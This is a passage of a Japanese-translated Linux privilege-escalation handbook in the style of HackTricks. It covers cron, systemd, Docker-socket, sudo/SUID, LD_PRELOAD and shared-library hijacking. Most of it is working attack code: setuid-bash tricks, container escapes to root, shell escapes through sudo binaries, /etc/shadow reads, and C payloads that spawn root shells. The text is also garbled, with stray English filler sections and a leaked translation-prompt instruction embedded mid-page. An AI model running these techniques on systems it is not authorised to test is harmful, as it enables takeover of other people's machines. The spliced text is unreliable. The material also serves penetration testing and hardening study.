| ------------------------------------------------- | -------------------- |
| GDMパスワード（Kaliデスクトップ、Debianデスクトップ） | gdm-password         |
| Gnome Keyring（Ubuntuデスクトップ、ArchLinuxデスクトップ） | gnome-keyring-daemon |
| LightDM（Ubuntuデスクトップ）                          | lightdm              |
| VSFTPd（アクティブなFTP接続）                   | vsftpd               |
| Apache2（アクティブなHTTPベーシック認証セッション）         | apache2              |
| OpenSSH（アクティブなSSHセッション - Sudoの使用）        | sshd:                |

#### Search Regexes/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## スケジュールされた/Cronジョブ

脆弱性のあるスケジュールされたジョブがないか確認してください。おそらく、rootによって実行されるスクリプトを利用することができます（ワイルドカードの脆弱性？rootが使用するファイルを変更できますか？シンボリックリンクを使用しますか？rootが使用するディレクトリに特定のファイルを作成しますか？）。
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### Cronのパス

例えば、_**/etc/crontab**_ 内にはPATHが記述されています: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_ユーザー「user」が/home/userに対して書き込み権限を持っていることに注意してください_)

もし、このcrontab内でrootユーザーがパスを設定せずにコマンドやスクリプトを実行しようとした場合、例えば: _\* \* \* \* root overwrite.sh_\
その場合、以下の方法でrootシェルを取得することができます:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### スクリプト内のワイルドカードを使用したCron（ワイルドカードインジェクション）

もしルートユーザーによって実行されるスクリプト内のコマンドに「\***」が含まれている場合、これを悪用して予期しないこと（例えば特権昇格）を行うことができます。例：
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**ワイルドカードが** _**/some/path/\*** **のようなパスの前にある場合、脆弱ではありません（** _**./\*** **も同様です）。**

ワイルドカードの悪用に関するさらなるトリックについては、次のページを参照してください：

{% content-ref url="wildcards-spare-tricks.md" %}
[wildcards-spare-tricks.md](wildcards-spare-tricks.md)
{% endcontent-ref %}

### Cronスクリプトの上書きとシンボリックリンク

**rootユーザーによって実行されるcronスクリプトを変更できる場合、非常に簡単にシェルを取得できます：**
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
もしrootによって実行されるスクリプトが、あなたが完全なアクセス権を持つ**ディレクトリ**を使用している場合、そのフォルダを削除し、代わりにあなたが制御するスクリプトがある別のフォルダへの**シンボリックリンクフォルダ**を作成することは有用かもしれません。
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### 頻繁なcronジョブ

プロセスを監視して、1分、2分、または5分ごとに実行されているプロセスを検索することができます。これを利用して特権をエスカレーションすることができるかもしれません。

例えば、**1分間に0.1秒ごとに監視**し、**実行されたコマンドが最も少ない順にソート**し、最も実行されたコマンドを削除するには、次のようにします:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**pspy**を使用することもできます（これにより、開始するすべてのプロセスが監視およびリストされます）。

### 目に見えないcronジョブ

コメントの後に改行文字を入れることで、cronジョブを作成することができます。例（改行文字に注意してください）：
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## サービス

### 書き込み可能な _.service_ ファイル

`.service` ファイルを書き込むことができるかどうかを確認してください。もし書き込むことができれば、サービスが **開始**、**再起動**、または **停止** されたときに、それを **変更して** バックドアを **実行** することができます（マシンが再起動されるまで待つ必要があるかもしれません）。\
例えば、バックドアを `.service` ファイル内に作成し、**`ExecStart=/tmp/script.sh`** とします。

### 書き込み可能なサービスバイナリ

サービスによって実行されるバイナリに **書き込み権限** がある場合、それらをバックドアに変更することができます。そのため、サービスが再度実行されるとバックドアが実行されます。

### systemd PATH - 相対パス

**systemd** が使用する PATH を以下のコマンドで確認できます：
```bash
systemctl show-environment
```
もし、パスのいずれかのフォルダに**書き込み**できることがわかった場合、**特権の昇格**が可能かもしれません。次のような**サービス設定ファイルで相対パスが使用されている**ものを探す必要があります。
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
次に、**実行可能な**ファイルを作成し、**相対パスバイナリと同じ名前**でsystemdのPATHフォルダに配置します。そして、サービスが脆弱なアクション（**開始**、**停止**、**再読み込み**）を実行するように要求されたときに、**バックドアが実行されます**（通常、特権のないユーザーはサービスの開始/停止ができませんが、`sudo -l`を使用できるかどうかを確認してください）。

**`man systemd.service`**でサービスについて詳しく学びましょう。

## **タイマー**

**タイマー**は、名前が`**.timer**`で終わるsystemdユニットファイルで、`**.service**`ファイルやイベントを制御します。**タイマー**は、カレンダー時間イベントとモノトニック時間イベントの組み込みサポートを持ち、非同期に実行することができるため、cronの代替として使用することができます。

次のコマンドですべてのタイマーを列挙できます：
```bash
systemctl list-timers --all
```
### 書き込み可能なタイマー

タイマーを変更できれば、systemd.unitの存在するもの（.serviceや.targetなど）を実行させることができます。
```bash
Unit=backdoor.service
```
ドキュメントでは、Unitについて次のように説明されています：

> このタイマーが経過したときにアクティブ化するUnitです。引数はUnit名であり、接尾辞は".timer"ではありません。指定されていない場合、この値はタイマーUnitと同じ名前のServiceにデフォルトで設定されます（上記を参照）。タイマーUnitのUnit名とアクティブ化されるUnit名は、接尾辞を除いて同じ名前であることが推奨されています。

したがって、この権限を悪用するには、次のことが必要です：

* **書き込み可能なバイナリを実行している**systemd Unit（たとえば、`.service`）を見つける
* **相対パスを実行している**systemd Unitを見つけ、**systemd PATH**に対して**書き込み権限**を持つ（その実行可能ファイルをなりすますため）

**`man systemd.timer`でタイマーについて詳しく学びましょう。**

### **タイマーの有効化**

タイマーを有効化するには、root権限が必要で、次のコマンドを実行します：
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
注意してください。**タイマー**は、`/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`にそれへのシンボリックリンクを作成することで**アクティブ化**されます。

## ソケット

簡単に言えば、Unixソケット（正確な名前はUnixドメインソケット、**UDS**）は、クライアントサーバーアプリケーションフレームワークで、同じマシンまたは異なるマシン上の2つの異なるプロセス間での**通信を可能にする**ものです。より正確に言えば、これは標準のUnixディスクリプタファイルを使用してコンピュータ間で通信する方法です（[ここから](https://www.linux.com/news/what-socket/)）。

ソケットは`.socket`ファイルを使用して設定できます。

**`man systemd.socket`でソケットについて詳しく学びましょう。**このファイル内では、いくつかの興味深いパラメータを設定できます。

* `ListenStream`、`ListenDatagram`、`ListenSequentialPacket`、`ListenFIFO`、`ListenSpecial`、`ListenNetlink`、`ListenMessageQueue`、`ListenUSBFunction`：これらのオプションは異なりますが、要約すると、ソケットが**どこでリッスンするか**を示します（AF\_UNIXソケットファイルのパス、リッスンするIPv4/6および/またはポート番号など）。
* `Accept`：真偽値の引数を取ります。**true**の場合、**受信した接続ごとにサービスインスタンスが生成**され、接続ソケットのみが渡されます。**false**の場合、すべてのリッスンソケット自体が**開始されたサービスユニットに渡され**、すべての接続に対して1つのサービスユニットが生成されます。この値は、単一のサービスユニットがすべての受信トラフィックを無条件に処理するデータグラムソケットとFIFOでは無視されます。**デフォルトはfalse**です。パフォーマンスのために、新しいデーモンは`Accept=no`に適した方法でのみ記述することを推奨します。
* `ExecStartPre`、`ExecStartPost`：1つ以上のコマンドラインを取ります。これらはリッスン**ソケット**/FIFOが**作成**および**バインド**される**前後に実行**されます。コマンドラインの最初のトークンは絶対ファイル名でなければならず、それに続いてプロセスの引数が続きます。
* `ExecStopPre`、`ExecStopPost`：これらは、リッスン**ソケット**/FIFOが**閉じられ**、**削除**される**前後に実行**される追加の**コマンド**です。
* `Service`：**受信トラフィック**で**アクティブ化する****サービス**ユニット名を指定します。この設定は、Accept=noのソケットにのみ許可されています。デフォルトでは、ソケットと同じ名前のサービス（接尾辞が置換されたもの）が使用されます。ほとんどの場合、このオプションを使用する必要はありません。

### 書き込み可能な .socket ファイル

**書き込み可能な** `.socket` ファイルを見つけた場合、`[Socket]` セクションの先頭に `ExecStartPre=/home/kali/sys/backdoor` のようなものを追加することができます。そのため、ソケットが作成される前にバックドアが実行されます。したがって、**おそらくマシンが再起動するまで待つ必要があります。**\
なお、バックドアが実行されるためには、システムがそのソケットファイルの設定を使用している必要があります。

### 書き込み可能なソケット

（ここでは設定の `.socket` ファイルについてではなく）**書き込み可能なソケット**を特定した場合、そのソケットと通信し、脆弱性を悪用することができるかもしれません。

### Unixソケットの列挙
```bash
netstat -a -p --unix
```
### 生の接続

To establish a raw connection, you can use the `nc` command. This command allows you to connect to a specific IP address and port. 

To connect to an IP address and port, use the following syntax:

```shell
nc <IP address> <port>
```

For example, to connect to IP address `192.168.0.1` on port `8080`, you would use the following command:

```shell
nc 192.168.0.1 8080
```

Once the connection is established, you can send and receive data through the terminal. To exit the connection, press `Ctrl + C`.

Keep in mind that establishing a raw connection can be useful for various purposes, including debugging network issues, testing network services, or even performing certain hacking techniques. However, it is important to use this technique responsibly and within legal boundaries.
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Exploitation example:**

{% content-ref url="socket-command-injection.md" %}
[socket-command-injection.md](socket-command-injection.md)
{% endcontent-ref %}

### HTTP ソケット

HTTP リクエストを待ち受ける **ソケット** がいくつか存在する可能性があります（_私は .socket ファイルではなく、UNIX ソケットとして機能するファイルについて話しています_）。次のコマンドで確認できます：
```bash
curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
```
もしソケットが**HTTPの応答**を返すなら、それと**通信**し、おそらく**いくつかの脆弱性を悪用**することができます。

### 書き込み可能なDockerソケット

**Dockerソケット**は通常、`/var/run/docker.sock`にあり、`root`ユーザーと`docker`グループのみが書き込み権限を持っています。\
もし何らかの理由でそのソケットに対して**書き込み権限**を持っている場合、特権を昇格させることができます。\
以下のコマンドを使用して特権を昇格させることができます:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
#### Dockerパッケージを使用せずに、ソケットからDocker Web APIを使用する

もし、**Dockerソケットにアクセス権がある**が、Dockerバイナリを使用できない場合（おそらくインストールされていないかもしれません）、`curl`を使用して直接Web APIを利用することができます。

以下のコマンドは、ホストシステムのルートをマウントするDockerコンテナを作成し、`socat`を使用して新しいDockerにコマンドを実行する方法の例です。
```bash
# List docker images
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
#[{"Containers":-1,"Created":1588544489,"Id":"sha256:<ImageID>",...}]
# Send JSON to docker API to create the container
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
#{"Id":"<NewContainerID>","Warnings":[]}
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```
最後のステップは、`socat`を使用してコンテナに接続し、"attach"リクエストを送信することです。
```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp

#HTTP/1.1 101 UPGRADED
#Content-Type: application/vnd.docker.raw-stream
#Connection: Upgrade
#Upgrade: tcp
```
### その他

注意してください。もし、あなたが**`docker`グループに所属している**ためにdockerソケットに対して書き込み権限を持っている場合、[**特権をエスカレーションするためのさらなる方法**](interesting-groups-linux-pe/#docker-group)があります。もし、[**docker APIがポートでリッスンしている場合、それを侵害することもできるかもしれません**](../../network-services-pentesting/2375-pentesting-docker.md#compromising)。

**Dockerを脱出するためのさらなる方法や特権をエスカレーションするためにそれを悪用する方法**については、以下を確認してください：

{% content-ref url="docker-security/" %}
[docker-security](docker-security/)
{% endcontent-ref %}

## Containerd (ctr) 特権エスカレーション

もし、**`ctr`**コマンドを使用できることがわかった場合、以下のページを読んでください。**特権をエスカレーションするためにそれを悪用することができるかもしれません**：

{% content-ref url="containerd-ctr-privilege-escalation.md" %}
[containerd-ctr-privilege-escalation.md](containerd-ctr-privilege-escalation.md)
{% endcontent-ref %}

## **RunC** 特権エスカレーション

もし、**`runc`**コマンドを使用できることがわかった場合、以下のページを読んでください。**特権をエスカレーションするためにそれを悪用することができるかもしれません**：

{% content-ref url="runc-privilege-escalation.md" %}
[runc-privilege-escalation.md](runc-privilege-escalation.md)
{% endcontent-ref %}

## **D-Bus**

D-BUSは、**プロセス間通信（IPC）システム**であり、アプリケーション同士が**簡単にコミュニケーションを取り合い、情報をやり取りし、サービスを要求する**ための強力なメカニズムを提供します。D-BUSは、現代のLinuxシステムのニーズを満たすために、ゼロから設計されました。

D-BUSは、完全な機能を備えたIPCおよびオブジェクトシステムであり、いくつかの目的で使用することができます。まず、D-BUSは基本的なアプリケーションIPCを実行できます。つまり、1つのプロセスが別のプロセスにデータを転送することができます。UNIXドメインソケットのようなものですが、より強力です。次に、D-BUSはイベントやシグナルをシステムを通じて送信することができます。これにより、システム内の異なるコンポーネントがコミュニケーションを行い、最終的にはより良く統合することができます。たとえば、Bluetoothデーモンは着信コールのシグナルを送信し、音楽プレーヤーはそれを受信して、通話が終了するまで音量をミュートにすることができます。最後に、D-BUSはリモートオブジェクトシステムを実装しており、1つのアプリケーションが別のオブジェクトからサービスを要求し、メソッドを呼び出すことができます。複雑さのないCORBAのようなものです。（[ここから](https://www.linuxjournal.com/article/7744)）

D-Busは、各メッセージ（メソッド呼び出し、シグナルの発行など）が一致するすべてのポリシールールの合計に応じて、**許可または拒否**されるという「許可/拒否モデル」を使用します。ポリシーの各ルールには、`own`、`send_destination`、または`receive_sender`属性が設定されている必要があります。

`/etc/dbus-1/system.d/wpa_supplicant.conf`のポリシーの一部：
```markup
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
したがって、ポリシーがユーザーが**バスとやり取りすることを許可**している場合、特権をエスカレーションするためにそれを悪用することができるかもしれません（おそらくいくつかのパスワードをリストアップするだけです）。

ユーザーまたはグループを指定しない**ポリシー**は、誰にでも影響を与えます（`<policy>`）。\
コンテキスト「default」のポリシーは、他のポリシーに影響を受けないすべての人に影響を与えます（`<policy context="default"`）。

**D-Bus通信の列挙とエスカレーションの方法を学ぶには、こちらを参照してください:**

{% content-ref url="d-bus-enumeration-and-command-injection-privilege-escalation.md" %}
[d-bus-enumeration-and-command-injection-privilege-escalation.md](d-bus-enumeration-and-command-injection-privilege-escalation.md)
{% endcontent-ref %}

## **ネットワーク**

ネットワークの列挙を行い、マシンの位置を特定することは常に興味深いです。

### 一般的な列挙
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#Files used by network services
lsof -i
```
### オープンポート

アクセスする前に、以前に対話できなかったマシンで実行されているネットワークサービスを常にチェックしてください。
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
```
### スニッフィング

トラフィックをスニッフィングできるかどうかを確認してください。もしできる場合、いくつかの資格情報を取得することができるかもしれません。
```
timeout 1 tcpdump
```
## ユーザー

### 一般的な列挙

自分が**誰であるか**、どのような**特権**を持っているか、システムにはどのような**ユーザー**がいるか、どのユーザーが**ログイン**できるか、どのユーザーが**ルート特権**を持っているかを確認します。
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
w
#Login history
last | tail
#Last log of each user
lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### Big UID

一部のLinuxバージョンは、**UID > INT\_MAX**を持つユーザーが特権をエスカレーションできるバグの影響を受けました。詳細は[こちら](https://gitlab.freedesktop.org/polkit/polkit/issues/74)、[こちら](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh)、および[こちら](https://twitter.com/paragonsec/status/1071152249529884674)を参照してください。\
**`systemd-run -t /bin/bash`**を使用して**エクスプロイト**します。

### グループ

ルート権限を付与できる可能性のある**いくつかのグループのメンバー**であるかどうかを確認してください：

{% content-ref url="interesting-groups-linux-pe/" %}
[interesting-groups-linux-pe](interesting-groups-linux-pe/)
{% endcontent-ref %}

### クリップボード

クリップボード内に興味深い情報があるかどうかを確認してください（可能な場合）。
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### パスワードポリシー

A strong password policy is essential for maintaining the security of a system. It helps prevent unauthorized access and protects sensitive information. Here are some key elements to consider when creating a password policy:

- **Password Complexity**: Require passwords to be a minimum length and include a combination of uppercase and lowercase letters, numbers, and special characters.

- **Password Expiration**: Set a policy that requires users to change their passwords regularly. This helps prevent the use of old or compromised passwords.

- **Password History**: Implement a policy that prevents users from reusing their previous passwords. This ensures that users are constantly creating new and unique passwords.

- **Account Lockout**: Set a limit on the number of failed login attempts before an account is locked. This helps protect against brute-force attacks.

- **Password Storage**: Store passwords securely using strong encryption algorithms. Avoid storing passwords in plain text or weakly hashed formats.

By implementing a strong password policy, you can significantly enhance the security of your system and reduce the risk of unauthorized access.
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### 既知のパスワード

もし環境の**どのパスワードかを知っている**場合は、各ユーザーとしてログインを試みてください。

### Su Brute

もし、多くのノイズを気にしないし、`su`と`timeout`バイナリがコンピュータに存在する場合は、[su-bruteforce](https://github.com/carlospolop/su-bruteforce)を使用してユーザーをブルートフォースすることができます。\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite)は、`-a`パラメータを使用してユーザーをブルートフォースすることもできます。

## 書き込み可能なPATHの悪用

### $PATH

もし、$PATHのいくつかのフォルダに**書き込みができる**ことがわかった場合は、書き込み可能なフォルダ内に**バックドアを作成**することで特権を昇格させることができるかもしれません。バックドアの名前は、別のユーザー（理想的にはroot）によって実行される予定のコマンドの名前であり、$PATHの書き込み可能なフォルダよりも前のフォルダからはロードされないものである必要があります。

### SUDOとSUID

sudoを使用していくつかのコマンドを実行することが許可されているか、suidビットが設定されているかもしれません。次のコマンドを使用して確認してください：
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
いくつかの**予期しないコマンドによって、ファイルの読み取りや書き込み、さらにはコマンドの実行が可能になります。** 例えば：
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Sudoの設定によって、パスワードを知らずに他のユーザーの特権でコマンドを実行することができる場合があります。
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
この例では、ユーザー `demo` は `root` として `vim` を実行できます。したがって、ルートディレクトリにSSHキーを追加するか、`sh` を呼び出すことでシェルを取得することは非常に簡単です。
```
sudo vim -c '!sh'
```
### SETENV

このディレクティブは、何かを実行する際に**環境変数を設定する**ことをユーザーに許可します。
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
この例は、HTBマシンAdmirerをベースにしており、スクリプトをrootとして実行する際に任意のPythonライブラリを読み込むためにPYTHONPATHハイジャックに対して**脆弱**でした。
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### パスをバイパスしてSudoを実行する

他のファイルを読み取るか、シンボリックリンクを使用します。例えば、sudoersファイルでは次のようになります: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
**ワイルドカード**（\*）が使用される場合、さらに簡単です:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**対策**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### コマンドパスを指定せずにSudoコマンド/SUIDバイナリを使用する

もし**sudo権限**がパスを指定せずに単一のコマンドに与えられている場合、例えば_hacker10 ALL= (root) less_、PATH変数を変更することでこれを悪用することができます。
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
このテクニックは、**suid** バイナリがパスを指定せずに別のコマンドを実行する場合にも使用することができます（常に**_strings_**で奇妙なSUIDバイナリの内容を確認してください）。

[実行するペイロードの例](payloads-to-execute.md)

### コマンドパスを持つSUIDバイナリ

もし、**suid** バイナリが**パスを指定して別のコマンドを実行する**場合、その場合は、suidファイルが呼び出しているコマンドと同じ名前の関数を**エクスポートする**ことを試してみることができます。

例えば、suidバイナリが _**/usr/sbin/service apache2 start**_ を呼び出している場合、その関数を作成してエクスポートする必要があります。
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
### LD\_PRELOAD & **LD\_LIBRARY\_PATH**

**LD\_PRELOAD**は、ローダーがCランタイムライブラリ（libc.so）を含む他のすべての共有ライブラリよりも前にロードする共有ライブラリまたは共有オブジェクトのパスを1つ以上含むオプションの環境変数です。これはライブラリのプリロードと呼ばれます。

_suid/sgid_実行可能バイナリの攻撃ベクトルとしてこのメカニズムが使用されるのを防ぐために、ローダーは_ruid != euid_の場合に_LD\_PRELOAD_を無視します。このようなバイナリでは、_suid/sgid_である標準パスのライブラリのみがプリロードされます。

**`sudo -l`**の出力の中に「_**env\_keep+=LD\_PRELOAD**_」という文がある場合、sudoを使用していくつかのコマンドを呼び出すことができるため、特権を昇格させることができます。
```
Defaults        env_keep += LD_PRELOAD
```
**/tmp/pe.c**として保存してください。
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
次に、それを**コンパイル**してください。以下のコマンドを使用します:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
最後に、特権を**エスカレーション**して実行します。
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
{% hint style="danger" %}
攻撃者が**LD\_LIBRARY\_PATH**環境変数を制御している場合、同様の特権昇格が悪用される可能性があります。攻撃者はライブラリが検索されるパスを制御しています。
{% endhint %}
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUIDバイナリ - .soインジェクション

もし、**SUID**権限を持つ奇妙なバイナリを見つけた場合、すべての**.so**ファイルが**正しくロードされているか**を確認することができます。以下のコマンドを実行してください。
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
たとえば、次のようなものが見つかった場合には、それを悪用することができます: _pen(“/home/user/.config/libcalc.so”, O\_RDONLY) = -1 ENOENT (ファイルやディレクトリが存在しません)_。

次のコードを使用して、ファイル _/home/user/.config/libcalc.c_ を作成します:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
以下のコマンドを使用してコンパイルします:
```bash
gcc -shared -o /home/user/.config/libcalc.so -fPIC /home/user/.config/libcalc.c
```
## 共有オブジェクトのハイジャック

Shared Object Hijacking（共有オブジェクトのハイジャック）は、特権昇格のための一般的なテクニックです。この攻撃では、悪意のある共有オブジェクトをターゲットシステムに注入し、特権を取得します。

### 攻撃手順

1. ターゲットアプリケーションの共有オブジェクトを特定します。
2. 悪意のある共有オブジェクトを作成します。
3. 悪意のある共有オブジェクトをターゲットシステムに配置します。
4. ターゲットアプリケーションを再起動するか、再読み込みします。
5. ターゲットアプリケーションが悪意のある共有オブジェクトを読み込むようにします。
6. 悪意のある共有オブジェクトが特権を取得し、攻撃者に制御を与えます。

### 防御策

以下の対策を実施することで、Shared Object Hijacking（共有オブジェクトのハイジャック）攻撃を防ぐことができます。

- ターゲットアプリケーションの共有オブジェクトのパスを絶対パスにする。
- システムの共有オブジェクトのパスを制限する。
- ターゲットアプリケーションの権限を制限する。
- ターゲットアプリケーションの署名を検証する。
- システムの共有オブジェクトを定期的に監視し、異常な変更を検知する。

以上がShared Object Hijacking（共有オブジェクトのハイジャック）攻撃についての概要です。この攻撃を理解し、適切な対策を実施することで、システムのセキュリティを向上させることができます。
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
以下は、特権昇格に関する情報を提供するハッキングの本からのコンテンツです。以下のコンテンツは、ファイルlinux-hardening/privilege-escalation/README.mdからのものです。関連する英文を日本語に翻訳し、翻訳結果を返してください。翻訳結果は、元のマークダウンおよびHTMLの構文を保持したままである必要があります。コード、ハッキング技術の名前、ハッキングに関連する用語、クラウド/SaaSプラットフォームの名前（Workspace、aws、gcpなど）、"leak"という単語、ペンテスト、およびマークダウンタグなどは翻訳しないでください。また、翻訳とマークダウンの構文以外の追加要素は追加しないでください。

```markdown
Now that we have found a SUID binary loading a library from a folder where we can write, lets create the library in that folder with the necessary name:
```

```html
今、書き込みができるフォルダからライブラリを読み込むSUIDバイナリを見つけたので、必要な名前でそのフォルダにライブラリを作成しましょう：
```
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
もし、以下のようなエラーが表示された場合、
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
そのため、生成したライブラリには `a_function_name` という名前の関数が必要です。

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) は、攻撃者がローカルのセキュリティ制限を回避するために悪用できるUnixバイナリの選別されたリストです。[**GTFOArgs**](https://gtfoargs.github.io/) は、コマンドに引数のみを注入できる場合に使用します。

このプロジェクトは、Unixバイナリの正当な機能を収集し、制限されたシェルからの脱出、特権の昇格または維持、ファイルの転送、バインドシェルとリバースシェルの生成、および他のポストエクスプロイテーションタスクを容易にします。

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'

{% embed url="https://gtfobins.github.io/" %}

{% embed url="https://gtfoargs.github.io/" %}

### FallOfSudo

`sudo -l` にアクセスできる場合、ツール [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) を使用して、どのsudoルールを悪用できるかを確認できます。

### Sudoトークンの再利用

